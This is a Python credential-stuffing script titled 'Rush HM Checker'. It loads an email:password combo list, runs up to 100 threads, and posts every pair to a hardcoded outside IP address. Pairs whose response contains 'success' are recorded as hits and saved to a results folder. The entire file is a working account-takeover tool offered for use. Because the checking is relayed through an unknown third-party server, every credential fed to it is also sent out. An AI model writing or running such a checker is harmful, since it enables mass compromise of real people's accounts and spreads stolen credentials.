import requests
import os
import time
import threading
from datetime import datetime
from colorama import Fore, Style

CHECKER_BANNER = """
\033[38;5;93m██████╗ ██╗   ██╗███████╗██╗  ██╗
\033[38;5;99m██╔══██╗██║   ██║██╔════╝██║  ██║
\033[38;5;105m██████╔╝██║   ██║███████╗███████║
\033[38;5;161m██╔══██╗██║   ██║╚════██║██╔══██║
\033[38;5;162m██║  ██║╚██████╔╝███████║██║  ██║
\033[38;5;196m╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
\033[38;5;51m██╗  ██╗███╗   ███╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
\033[38;5;45m██║  ██║████╗ ████║    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
\033[38;5;39m███████║██╔████╔██║    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
\033[38;5;33m██╔══██║██║╚██╔╝██║    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
\033[38;5;27m██║  ██║██║ ╚═╝ ██║    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
\033[38;5;21m╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\033[0m"""

class RushChecker:
    def __init__(self):
        self.hits = 0
        self.fails = 0
        self.retries = 0
        self.checked = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.setup_directories()

    def setup_directories(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.results_dir = f"checker_results_{timestamp}"
        os.makedirs(self.results_dir, exist_ok=True)
        os.makedirs(os.path.join(self.results_dir, "hits"), exist_ok=True)
        os.makedirs(os.path.join(self.results_dir, "fails"), exist_ok=True)

    def clark(self, email, password):
        json_data = {
            "email": email,
            "pass": password
        }
        return requests.post("http://134.255.218.89:6969/check", json=json_data)

    def check_account(self, email, password):
        try:
            response = self.clark(email, password)
            
            with self.lock:
                self.checked += 1
                if "success" in response.text.lower():
                    self.hits += 1
                    self.save_result("hits", f"{email}:{password}", response.text)
                    print(f"{Fore.GREEN}[HIT] {email}:{password} | {response.text}{Style.RESET_ALL}")
                else:
                    self.fails += 1
                    self.save_result("fails", f"{email}:{password}", response.text)
                    print(f"{Fore.RED}[FAIL] {email}:{password}{Style.RESET_ALL}")
                
                self.print_progress()
                
        except Exception as e:
            with self.lock:
                self.retries += 1
                print(f"{Fore.YELLOW}[ERROR] {email}:{password} | {str(e)}{Style.RESET_ALL}")

    def print_progress(self):
        elapsed = time.time() - self.start_time
        cpm = int((self.checked / elapsed) * 60) if elapsed > 0 else 0
        print(f"{Fore.CYAN}[PROGRESS] Checked: {self.checked} | Hits: {self.hits} | Fails: {self.fails} | CPM: {cpm}{Style.RESET_ALL}")

    def save_result(self, type_folder, combo, response):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        filepath = os.path.join(self.results_dir, type_folder, f"{type_folder}.txt")
        with open(filepath, "a") as f:
            f.write(f"[{timestamp}] {combo} | {response}\n")

    def start(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(CHECKER_BANNER)
        
        combo_file = input(f"{Fore.CYAN}Enter combo file path: {Style.RESET_ALL}")
        threads = input(f"{Fore.CYAN}Enter number of threads (default 100): {Style.RESET_ALL}")
        threads = int(threads) if threads.isdigit() else 100

        try:
            with open(combo_file, 'r') as f:
                combos = [line.strip() for line in f if ':' in line]

            print(f"\n{Fore.CYAN}[+] Loaded {len(combos)} combos{Style.RESET_ALL}")
            
            threads_list = []
            for combo in combos:
                if ':' in combo:
                    email, password = combo.split(':')
                    while threading.active_count() > threads:
                        time.sleep(0.1)
                    
                    thread = threading.Thread(target=self.check_account, args=(email, password))
                    thread.start()
                    threads_list.append(thread)

            for thread in threads_list:
                thread.join()

            print(f"\n{Fore.GREEN}[+] Checking completed!")
            print(f"[+] Total Hits: {self.hits}")
            print(f"[+] Total Fails: {self.fails}")
            print(f"[+] Total Retries: {self.retries}{Style.RESET_ALL}")
            
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] Combo file not found!{Style.RESET_ALL}")

        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
